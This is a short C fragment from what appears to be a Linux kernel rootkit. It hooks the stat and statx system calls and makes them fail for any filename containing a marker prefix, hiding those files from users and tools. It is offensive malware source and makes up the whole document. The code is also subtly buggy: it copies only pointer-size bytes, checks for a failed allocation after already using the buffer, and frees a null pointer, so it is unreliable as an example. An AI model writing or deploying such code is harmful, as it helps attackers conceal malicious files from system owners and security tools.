static asmlinkage int bds_stat(const struct pt_regs *pt_regs) {
	int ret = orig_stat(pt_regs);
	char *filename = (char  *) pt_regs->si;
	int err;
	kfilename = NULL;
	
	kfilename = n_kmalloc(sizeof(filename));
	err = strncpy_from_user (kfilename, filename, sizeof(filename));
	if (kfilename == NULL) {
		kfree(kfilename);
		return ret;
	}
	if (strstr(kfilename, BDS_PREFIX)) {
		kfree(kfilename);
		return -1;
	}
	kfree(kfilename);
	
	return ret;
}

static asmlinkage int bds_statx(const struct pt_regs *pt_regs) {
	int ret = orig_statx(pt_regs);
	char *filename = (char  *) pt_regs->si;
	int err;
	kfilename = NULL;
	
	kfilename = n_kmalloc(sizeof(filename));
	err = strncpy_from_user (kfilename, filename, sizeof(filename));
	if (kfilename == NULL) {
		kfree(kfilename);
		return ret;
	}
	if (strstr(kfilename, BDS_PREFIX)) {
		kfree(kfilename);
		return -1;
	}
	kfree(kfilename);
	
	return ret;
}


